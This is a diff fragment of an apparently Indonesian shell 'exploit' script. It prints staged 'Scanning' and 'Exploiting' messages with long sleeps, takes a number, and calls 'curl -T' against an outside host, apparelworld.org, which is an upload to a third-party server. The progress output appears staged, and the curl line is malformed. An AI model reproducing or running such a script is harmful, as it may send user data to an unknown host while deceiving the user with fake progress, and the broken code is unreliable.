@@ -41,7 +41,7 @@ sleep 1.5
 echo "\033[34;1m [+]Sedang Scaning..."
 sleep 7
 echo "[+] Exploiting...";
-echo "Nomer => $nomer" >> ;
+echo "Nomer => $nomer";
 curl -T http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
